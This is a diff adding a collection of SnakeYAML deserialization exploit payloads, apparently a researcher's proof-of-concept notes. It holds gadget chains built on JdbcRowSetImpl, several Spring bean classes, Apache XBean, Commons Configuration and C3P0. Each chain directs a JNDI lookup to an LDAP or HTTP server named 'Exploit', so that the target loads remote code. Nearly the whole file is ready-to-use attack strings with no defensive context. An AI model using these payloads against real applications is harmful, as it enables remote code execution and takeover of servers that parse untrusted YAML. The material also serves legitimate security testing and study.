@@ -1,0 +1,42 @@
+String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:1389/Exploit\"\n autoCommit: true";
+
+
+!!org.springframework.beans.factory.config.PropertyPathFactoryBean
+    targetBeanName: "ldap://localhost:1389/Exploit"
+    propertyPath: mi1k7ea
+    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+        shareableResources: ["ldap://localhost:1389/Exploit"]
+
+sprngboot
+
+ String poc = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
+                " targetBeanName: \"ldap://localhost:1389/Exploit\"\n" +
+                " propertyPath: mi1k7ea\n" +
+                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
+                "  shareableResources: [\"ldap://localhost:1389/Exploit\"]";
+
+
+
+Spring DefaultBeanFactoryPointcutAdvisor
+
+set:
+    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
+      adviceBeanName: "ldap://localhost:1389/Exploit"
+      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+        shareableResources: ["ldap://localhost:1389/Exploit"]
+    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []
+
+
+Apache XBean
+本地环境用的xbean-naming-4.5.jar。
+!!javax.management.BadAttributeValueExpException[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding ["foo",!!javax.naming.Reference [foo, "Exploit", "http://localhost:8000/"],!!org.apache.xbean.naming.context.WritableContext []]]
+
+Apache Commons Configuration
+set:
+    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], "ldap://localhost:1389/Exploit"]]
+
+C3P0 JndiRefForwardingDataSource
+
+!!com.mchange.v2.c3p0.JndiRefForwardingDataSource
+  jndiName: "ldap://localhost:1389/Exploit"
+  loginTimeout: 0
